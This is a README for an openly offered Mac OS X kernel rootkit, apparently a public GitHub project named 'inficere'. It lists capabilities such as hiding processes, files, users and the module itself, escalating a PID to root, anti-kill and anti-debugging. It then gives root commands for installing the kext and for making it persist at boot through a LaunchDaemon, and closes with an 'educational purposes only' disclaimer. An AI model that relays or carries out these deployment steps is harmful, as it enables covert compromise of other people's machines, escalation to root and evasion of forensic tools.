inficere
========

Public version of my Mac OS X rootkit built on top of fractalG's onyx-the-black-cat (https://github.com/gdbinit/onyx-the-black-cat)


Tested only in Mountain Lion, 10.8.2 to 10.8.5. Not guaranteed to work on other versions.


## Features

- process hiding - hides from 'ps PID', 'ps aux', Activity Monitor, top, etc
- file/directory hiding
- user hiding - hides a specified user from 'who', 'w'
- self hiding - hides the module itself from kextstat and volatility
- anti-kill
- PID to UID 0
- anti-debug tricks (mostly by @osxreverser) - anti-anti-ptrace, patch task_for_pid(0), etc

## Instructions

1. `# chmod -R 755 inficere.kext`
2. `# chown -R root:wheel inficere.kext`
3. `# mv inficere.kext /System/Library/Extensions/`
4. `# kextutil /System/Library/Extensions/inficere.kext`
5. `# ./control`

For boot persistence:

1. `# plutil -convert binary1 com.enzo.inficere.plist`
2. `# mv com.enzo.inficere.plist /Library/LaunchDaemons/com.enzo.inficere.plist`
3. `# chown root:wheel /Library/LaunchDaemons/com.enzo.inficere.plist`
4. `# launchctl load -w /Library/LaunchDaemons/com.enzo.inficere.plist`

Inficere will hide above files after loaded.

-

I would like to emphasise that I made this for educational purposes only.
